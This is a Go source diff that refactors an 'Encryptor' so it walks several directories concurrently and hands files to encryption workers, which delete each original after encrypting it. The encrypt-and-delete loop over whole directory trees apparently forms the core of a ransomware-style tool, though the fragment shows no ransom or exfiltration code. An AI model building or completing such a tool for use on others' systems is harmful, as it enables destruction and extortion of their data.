@@ -23,7 +23,6 @@ type Encryptor struct {
 	ErrChan        chan error
 	Done           chan struct{}
 	WorkerCount    int
-	wg             *sync.WaitGroup
 }
 
 func (e *Encryptor) Enumerate(p string, d fs.DirEntry, err error) error {
@@ -79,12 +78,29 @@ func (e *Encryptor) Encrypt(path string) error {
 	return os.Remove(path)
 }
 
-// TODO: setup workers for go func() { encrypt() }()
+func (e *Encryptor) EnumerateDirectories(dirs []string) {
+	var wg sync.WaitGroup
+
+	wg.Add(len(dirs))
+	for _, d := range dirs {
+		go func() {
+			defer wg.Done()
+			e.ErrChan <- filepath.WalkDir(d, e.Enumerate)
+		}()
+	}
+
+	go func() {
+		wg.Wait()
+		e.Done <- struct{}{}
+	}()
+}
+
 func (e *Encryptor) ListenAndEncrypt() error {
-	e.wg = new(sync.WaitGroup)
-	e.wg.Add(e.WorkerCount)
+	var wg sync.WaitGroup
+
+	wg.Add(e.WorkerCount)
 	for range e.WorkerCount {
-		go e.NewWorker()
+		go e.NewWorker(&wg)
 	}
 
 	for {
@@ -100,7 +116,7 @@ func (e *Encryptor) ListenAndEncrypt() error {
 			}
 		case <-e.Done:
 			close(e.JobChan)
-			e.wg.Wait()
+			wg.Wait()
 			return nil
 		}
 	}
